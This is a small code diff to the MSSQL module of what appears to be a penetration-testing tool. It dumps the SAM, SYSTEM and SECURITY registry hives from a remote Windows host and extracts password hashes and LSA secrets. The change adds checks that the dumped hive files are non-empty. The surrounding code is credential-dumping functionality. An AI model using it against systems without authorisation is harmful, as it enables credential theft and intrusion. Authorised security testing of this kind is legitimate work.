@@ -521,13 +521,17 @@ class mssql(connection):
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             exec_method.execute(dump_command)
-            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
-            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
+            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             exec_method.execute(clean_command)
         except Exception as e:
             self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
             self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
         else:
+            if not (os.path.exists(f"{output_filename}.sam") and os.path.getsize(f"{output_filename}.sam") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SAM or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
             self.logger.display("Dumping SAM hashes")
             local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
@@ -557,6 +561,10 @@ class mssql(connection):
             self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
             self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
         else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
             self.logger.display("Dumping LSA secrets")
             local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
